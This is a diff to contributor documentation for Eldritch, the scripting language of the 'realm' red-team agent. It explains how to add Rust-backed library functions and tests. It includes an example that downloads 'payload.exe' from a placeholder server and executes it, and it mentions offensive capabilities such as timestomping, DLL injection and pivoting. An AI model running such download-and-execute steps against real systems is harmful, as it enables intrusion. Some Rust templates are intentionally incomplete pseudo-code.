@@ -6,14 +6,14 @@ description: Want to implement new functionality in the agent? Start here!
 permalink: dev-guide/eldritch
 ---
 
-# Overview
-Eldritch expands the capability of realm agents allowing them to perform actions programmatically.
-Not all tasks should be done through Eldritch though. Eldritch is meant to create the building blocks that operators can use during tests.
-Creating a function that is too specific could limit it's usefulness to other users.
+## Overview
+
+Eldritch is a Pythonic DSL for Red Team engagements. Eldritch is intended to provide the building-block functionality that operators need, and then operators will compose the provided functionality using Tomes. Creating a function that is too specific could limit it's usefulness to other users.
 
 **For example**: if you want to download a file to a specific location, execute it, and return the functions result this should be chunked into separate `download`, and `execute` functions within Eldritch. The example use case should look like:
 
 The Eldritch tome could look like this:
+
 ```python
 file.download("http://fileserver.net/payload.exe", "C:/temp/")
 sys.exec("C:/temp/payload.exe")
@@ -24,79 +24,105 @@ _Eg. port scanning could be implemented using a for loop and `tcp_connect` howev
 
 Want to contribute to Eldritch but aren't sure what to build check our ["good first issue" tickets.](https://github.com/spellshift/realm/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
 
-# Creating a function
+## Create an Eldritch Function
 
-## What files should I modify to make an Eldritch function.
 ---
-#### Documentation
-`docs/_docs/user-guide/eldritch.md`
-Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch module.
 
-Currently Eldritch has seven modules your function can fall under:
+### Update Documentation
+
+`docs/_docs/user-guide/eldritch.md`
+Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch Library.
+
+Currently Eldritch has eight libraries your function can be bound to:
+
 * `assets`: Is used to interact with files stored natively in the agent.
 * `crypto` Is used to encrypt/decrypt or hash data.
 * `file`: Is used for any on disk file processing.
-* `pivot`: Is used to migrate to identify, and migrate between systems. The pivot module is also responsible for facilitating connectivity within an environment.
+* `pivot`: Is used to migrate to identify, and migrate between systems. The pivot library is also responsible for facilitating connectivity within an environment.
 * `process`: Is used to manage running processes on a system.
+* `report`: Is used to report structured data to the caller of the eldritch environment (e.g. to the c2).
 * `sys`: Is used to check system specific configurations and start new processes.
-* `time`: Is used for obtaining and formatting time or adding delays into code
+* `time`: Is used for obtaining and formatting time or adding delays into code.
 
-If your function does not fall under a specific module reach out to the core developers about adding a new module or finding the right fit.
+If your function does not fall under a specific standard library reach out to the core developers about adding a new library or finding the right fit.
 
 Specify the input and output according to the [Starlark types spec.](https://docs.rs/starlark/0.6.0/starlark/values/index.html)
-If there are OS or edge case specific behaviors make sure to document them here. If there are limitations Eg. if a function doesn't use file streaming specify that it can't be used for large files.
-Please add your function in alphabetical order this makes it easy to search by key words.
-```markdown
-### module.function
-module.function(arg1: str, arg2: int, arg3: list) -> bool
+If there are OS or edge case specific behaviors make sure to document them here. If there are limitations (e.g. if a function doesn't use file streaming) specify that it can't be used for large files.
 
-The <b>module.function</b> describe your function and edge cases.
+Please add your function in alphabetical order this makes it easy to search by key words.
+
+```markdown
+### library.function
+library.function(arg1: str, arg2: int, arg3: list) -> bool
+
+The <b>library.function</b> describe your function and edge cases.
 ```
 
-#### Eldritch definition
-`implants/lib/eldritch/src/module.rs`
-Add a function definition here, where `module.rs` is the name of the module you selected above. This is how the Eldritch language is made aware that your function exists.
+#### Add Library Binding
 
-Add the import for your functions implementation at the top, try to keep these in alphabetical order for readability.
-Then add the function definition under the methods function
+A `Library Binding` is what enables you to bind rust code to a library that is exposed to the eldritch runtime. For example, the `Library Binding` for the `file.append()` eldritch method is created in [`src/file/mod.rs`](https://github.com/spellshift/realm/blob/main/implants/lib/eldritch/src/file/mod.rs) and implemented in [`src/file/append_impl.rs`](https://github.com/spellshift/realm/blob/main/implants/lib/eldritch/src/file/append_impl.rs). A Library Binding translates starlark types (e.g. [`UnpackValue`](https://docs.rs/starlark/latest/starlark/values/trait.UnpackValue.html)) to rust types where needed. Many common rust types (e.g. `String`) already implement `UnpackValue`, and so they can be directly forwarded to your rust implementation. The goal of a `Library Binding` is to enable the rust implementation to be as starlark-agnostic as possible.
+
+To create a new `Library Binding`, add a new nested function in `implants/lib/eldritch/src/<library>/mod.rs`, where `<library>` is the name of the library you selected above (e.g. `file`). Your function should be nested in the `fn methods(builder: &mut MethodsBuilder)` block, which will automatically register it on the selected library (via the `#[starlark_module]` proc_macro). For example, adding an `append()` implementation in the `methods()` of `src/file/mod.rs` will expose a new function to eldritch, callable via `file.append(args..)`.
+
+##### Example Library Binding
+
+Below is a code example for creating a new library binding for the method `function`, which has a rust implementation `function_impl::function()`.
+
 ```rust
-...
+// eldritch/src/<library>/mod.rs
+//...
+// A module where the rust implementation of your function will live (sorted alphabetically)
 mod function_impl;
-...
+mod other_function_impl;
+
+// A few imports used in this example
+use starlark::{
+    environment::MethodsBuilder,
+    values::{list::UnpackList, none::NoneType},
+};
+
+//...
 #[starlark_module]
 fn methods(builder: &mut MethodsBuilder) {
-...
-    fn function(this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<String> {
-        if false { println!("Ignore unused this var. _this isn't allowed by starlark. {:?}", this); }
-        function_impl::function(arg1, arg2, arg3)
-    }
-```
+    //...
 
-You may notice that some functions follow the pattern:
-```rust
-    fn function(this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<NoneType> {
-        if false { println!("Ignore unused this var. _this isn't allowed by starlark. {:?}", this); }
-        function_impl::function(arg1, arg2, arg3)?;
+    // This Library Binding is what eldritch calls when it evaluates `your_library.function()`
+    // It will attempt to unpack any arguments based on the signature defined here.
+    // Additional requirements for your function and it's args can be enforced using the `#[starlark(...)]`` proc_macro.
+    #[allow(unused_variables)]
+    fn function(this: &YourLibrary, arg1: String, arg2: u8, arg3: UnpackList<String>) -> anyhow::Result<String> {
+
+        // Vec does not implement UnpackValue, but the starlark evaluator provides an UnpackList to wrap Vec.
+        // Here, our Library Binding accepts an UnpackList from the evaluator, but passes a Vec to our underlying
+        // rust implementation.
+        function_impl::function(arg1, arg2, arg3.items)
+    }
+
+    // If your function does not return a value, return a NoneType instead
+    #[allow(unused_variables)]
+    fn other_function(this: &YourLibrary) -> anyhow::Result<NoneType> {
+        other_function_impl::other_function()?;
         Ok(NoneType{})
     }
 ```
-This pattern is only used for none type returns since we're returning Starlark None. Returning like this in the module file is more streamlined than having each module return a special starlark type.
 
-### Eldritch Implementation
-`implants/lib/eldritch/src/module/function_impl.rs`
-Add your function implementation here, where `/module/` is the name of the module you selected above and `/function_impl.rs` is the name of your function with `_impl.rs` appended after it. This should match what's been put in the module file.
-This file will contain the actual implementation, helper functions, and unit tests for your function.
+#### Create Rust Implementation
 
-Here's a template of how your code should look:
+Now that we've setup a `Library Binding`, most of the eldritch/starlark specific code is out of the way. All that's left is to implement a rust function that we want to expose to eldritch. First, create a new rust module at `implants/lib/eldritch/src/<library>/<function>_impl.rs` where `<library>` is the name of the library you have created a binding for and `<function>` is the name of the bound function you wish to expose to eldritch. This file will contain your rust implementation, any associated helper functions / types, and unit tests for your function.
+
+##### Example Rust Implementation
+
 ```rust
+// eldritch/src/<library>/function_impl.rs
 use anyhow::Result;
 
 fn helper(argz: String) -> bool {
     // Do helper stuff
 }
 
-pub fn function(path: arg1: String, arg2: u8, arg3: Vec<String>) -> bool {
+pub fn function(path: arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<bool> {
     // Do code stuff
+    Ok(true)
 }
 
 #[cfg(test)]
@@ -131,37 +157,38 @@ mod tests {
 }
 ```
 
-### `eldritch/runtime.rs` tests
+#### Update `eldritch/mod.rs` tests
 
-Lastly you'll need to add your function to the `eldritch/runtime.rs` integration test. Add your function to it's respective parent binding in alphabetical order.
+Lastly, you'll need to add your new function to the `eldritch/runtime.rs` integration test. These tests assert that a predefined list of functions are available for each library. Add your function to it's respective `Library Binding` in alphabetical order.
 
 ```rust
-    // Binding for the "file" functions
+    // Binding for the "file" library functions
     file_bindings: TestCase {
         tome: Tome {
             eldritch: String::from("print(dir(file))"),
             parameters: HashMap::new(),
             file_names: Vec::new(),
         },
+        // Add the name of your function to this list, in alphabetical order
         want_output: String::from(r#"["append", "compress", "copy", "download", "exists", "find", "follow", "is_dir", "is_file", "list", "mkdir", "moveto", "read", "remove", "replace", "replace_all", "template", "timestomp", "write"]"#),
         want_error: None,
     }
 ```
 
-Add your function in alphabetical order to the list of the module it belongs to.
-This test is done to ensure that all functions are available to the interpreter.
+#### Implementation tips
 
-**Implementation tips:**
-* If working with files & network connections use streaming to avoid issues with large files.
-* If your function depends on resources outside of eldritch (Eg. files, network, etc.) implement helper function that allow the user to proactively test for errors. If your function requires a specific type of file to work consider implementing a function like `is_file` or `is_lnk`.
+* When working with files & network connections, use streaming to avoid memory issues with large files.
+* If your function depends on resources outside of eldritch (Eg. files, network, etc.) implement helper function that allow the user to proactively test for errors. For example, if your function requires a specific file type, ensure a function such as `is_file` or `is_link` is also exposed to eldritch.
 
 ### Testing
+
 Testing can be really daunting especially with complex system functions required by security professionals.
 If you have any questions or hit any road blocks please reach out we'd love to help, also feel free to open a draft PR with what you have and mark it with the `help wanted` tag.
-Testing isn't meant to be a barrier to contributing but instead a safety net so you know your code doesn't affect other systems. If it's become a blocker please reach out so we can help 🙂
+Testing isn't meant to be a barrier to contributing but instead a safety net so you know your code doesn't affect other systems. If it becomes a blocker please reach out so we can help 🙂
 
-**Goals**
-1. Cross platform
+#### How to Test
+
+1. Test must be cross-platform.
 2. Test basic functionality.
 3. Test negative cases.
 4. Prevent regression.
@@ -169,16 +196,16 @@ Testing isn't meant to be a barrier to contributing but instead a safety net so 
 
 **Tips**
 Any methods added to the Eldritch Standard Library should have tests collocated in the method's `<function>_impl.rs` file. Here are a few things to keep in mind:
+
 * Tests should be cross platform
-    * Rely on [NamedTempFile](https://docs.rs/tempfile/1.1.1/tempfile/struct.NamedTempFile.html) for temporary files
-    * Rely on [path.join](https://doc.rust-lang.org/stable/std/path/struct.Path.html) to construct OS-agnostic paths
+  * Rely on [NamedTempFile](https://docs.rs/tempfile/1.1.1/tempfile/struct.NamedTempFile.html) for temporary files
+  * Rely on [path.join](https://doc.rust-lang.org/stable/std/path/struct.Path.html) to construct OS-agnostic paths
 * Chunk out implementation code into discrete helper functions so each can be tested individually.
 
-### Example PR for an Eldritch method.
-Check out [this basic example of a PR](https://github.com/spellshift/realm/pull/231) to see what they should look like.
-This PR implements the `sys.hostname` function into Eldritch and is a simple example of how to get started.
+## Additional Notes
 
-# OS Specific functions
+### OS Specific functions
+
 ---
 Limit changes to the implementation file.
 
@@ -187,28 +214,33 @@ This ensures that all functions are exposed in every version of the Eldritch lan
 To prevent errors and compiler warnings use the `#[cfg(target_os = "windows")]` conditional compiler flag to suppress OS specific code.
 For all non supported OSes return an error with a message explaining which OSes are supported.
 **Example**
+
 ```rust
     #[cfg(not(target_os = "windows"))]
     return Err(anyhow::anyhow!("This OS isn't supported by the dll_inject function.\nOnly windows systems are supported"));
 ```
 
-# Notes about using dictionary type `Dict`
+### Using `Dict`
+
 ---
 The `Dict` type requires dynamic memory allocation in starlark. In order to achieve this we can leverage the `starlark::Heap` and push entries onto it. It's pretty simple to implement and starlark does some magic to streamline the process. To make the heap available to your function simply add it as an argument to your function.
 
-## Different function declarations
-`implants/lib/eldritch/src/module.rs`
+#### Example `Dict` function declarations
+
+`implants/lib/eldritch/src/sys/mod.rs`
 
 ```rust
-    fn function<'v>(this: SysLibrary, starlark_heap: &'v Heap, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<Dict<'v>> {
+    fn function<'v>(this: SysLibrary, starlark_heap: &'v Heap, arg1: String, arg2: u8, arg3: UnpackList<String>) -> anyhow::Result<Dict<'v>> {
 ```
 
-`implants/lib/eldritch/src/module/function_impl.rs`
+`implants/lib/eldritch/src/sys/function_impl.rs`
+
 ```rust
-pub fn function(starlark_heap: &Heap, arg1: String, arg2: u8, arg3: Vec<String>) -> Result<Dict> {
+pub fn function(starlark_heap: &Heap, arg1: String, arg2: u8, arg3: UnpackList<String>) -> Result<Dict> {
 ```
 
-## Split starlark boilerplate and function implementation
+#### Split starlark boilerplate and function implementation
+
 One note is when working with starlark `Dict` types it preferred that a `handle_` function be implemented which returns a real data type and that data type is translated from the rust data type to starlark `Dict` in the `function` for example:
 
 ```rust
@@ -236,101 +268,20 @@ pub fn get_os(starlark_heap: &Heap) -> Result<Dict> {
 
 Splitting the code to handle inserting data into the `Dict` helps keep the code organized and also allows others looking to eldritch as an example of how things can be implemented to more clearly delineate where the technique stops and the eldritch boilerplate begins.
 
-## Testing
-When testing you can pass a clean heap from your test function into your new function.
-```rust
-...
-#[cfg(test)]
-mod tests {
-    use super::*;
+### Using `Async`
 
-    #[test]
-    fn test_function() -> anyhow::Result<()>{
-        let test_heap = Heap::new();
-        let res = function(&test_heap)?;
-        assert!(res.contains("success"));
-    }
-}
-```
-
-## Example PR
-Example of how to return a dictionary:
-PR #[238](https://github.com/spellshift/realm/pull/238/files) This PR implements the `sys.get_os` function which returns a dictionary of string types.
-
-# Notes about asynchronous Eldritch code
 ---
-### Async example
-In order to run concurrent tasks we need to build an asynchronous function. This is useful if you're building a function that needs to do two things at once or that can benefit from running discrete tasks in parallel.
+When writing performant code bound by many I/O operations, it can be greatly beneficial to use `async` methods and a scheduler, to enable CPU bound operations to be performed while awaiting I/O. This can dramatically reduce latency for many applications. Using `async` for your eldritch function implementations can be difficult however, as our underlying `starlark` dependency does not yet have great `async` support. It can be done, but it will add complexity to your code and must be implemented carefully. **YOU SHOULD NOT** implement `async` functions without having a complete understanding of how eldritch manages threads and it's own async runtime. Doing so will likely result in bugs, where you attempt to create a new `tokio::Runtime` within an existing runtime. By default, the `eldritch::Runtime` creates a new blocking thread (`tokio::task::spawn_blocking`), which helps prevent it from blocking other tome evaluation. Any results reported via the `report` library will already be concurrent with the thread that started the eldritch evaluation. **ALL ELDRITCH CODE IS SYNCHRONOUS** which means that creating an `async` function will not enable tome developers to run code in parallel, it just may allow the `tokio` scheduler to allocate CPU away from your code while it awaits an I/O operation. The primary performance benefits of using `async` is for the environment from which eldritch is being run, it is unlikely to impact the performance of any individual Tome (due to their synchronous nature).
 
-The starlark bindings we're using to create Eldritch are not asynchronous therefore the Eldritch function itself cannot be asynchronous.
-To get around this we use the [`tokio::runtime::Runtime.block_on()`](https://docs.rs/tokio/latest/tokio/runtime/struct.Runtime.html#method.block_on) function in conjunction with two asynchronous helpers.
+#### Async Testing
 
-We'll create the following three functions to manage concurrent tasks:
-* `pub fn function` - Eldritch function implementation which will implement the `tokio::runtime::Runtime.block_on()` function.
-* `async fn handle_function` - Async helper function that will start, track, and join async tasks.
-* `async fn run_function` - Async function runner that gets spawned by the `handle_function` function.
-
-An example of how you might run multiple concurrent tasks asynchronously.
-```rust
-// Async handler for Eldritch function
-async fn run_function(argstr: String) -> Result<String> {
-    // Do async stuff
-}
-
-async fn handle_function(arg1: Vec<String>) -> Result<Vec<String>> {
-    let mut result: Vec<String> = Vec::new();
-    // This vector will hold the handles to our futures so we can retrieve the results when they finish.
-    let mut all_result_futures: Vec<_> = vec![];
-    // Iterate over all values in arg1.
-    for value in arg1 {
-        // Iterate over all listed ports.
-        let resulting_future = run_function(value);
-        all_result_futures.push(task::spawn(resulting_future));
-    }
-
-    // Await results of each task.
-    // We are not acting on scan results independently so it's okay to loop through each and only return when all have finished.
-    for task in all_result_futures {
-        match task.await? {
-            Ok(res) => result.push(res),
-            Err(err) => return anyhow::private::Err(err),
-        };
-    }
-
-    Ok(result)
-}
-
-// Non-async wrapper for our async scan.
-pub fn function(arg1: Vec<String>) -> Result<Vec<String>> {
-    let runtime = tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .unwrap();
-
-    let response = runtime.block_on(
-        handle_function(target_cidrs)
-    );
-
-    match response {
-        Ok(result) => Ok(result),
-        Err(_) => return response,
-    }
-}
-
-// Testing ...
-```
-
-**Implementation tips:**
-* If running a lot of concurrent tasks the system may run out of open file descriptors. Either handle this error with a wait and retry, or proactively rate limit your tasks well below the default limits.
-
-
-### Testing async code requires some additional work
 You'll need to write tests for your synchronous and asynchronous code.
 Async tests will usually start two threads one for your function and one that mocks (or reimplements) the feature you're testing against.
 For example if testing a port scanner or netcat like function you'll want to run a test port listener for your feature to connect to.
 Network ports test servers have been implemented in `pivot.ncat` and `pivot.port_scan` an example SSH server has been implemented in `pivot.ssh_exec`.
 
 Tests for async functions may look like this:
+
 ```rust
 // Command implementation code.
 // ....
@@ -375,8 +326,3 @@ mod tests {
     }
 }
 ```
-
-### Async PR example
-An example of how async can be used in testing: [PR for the Eldritch `pivot.ncat` implementation](https://github.com/spellshift/realm/pull/44/files).
-
-An example of testing async functions with multiple concurrent functions: [PR for the Eldritch `pivot.port_scan` implementation](https://github.com/spellshift/realm/pull/45/files).
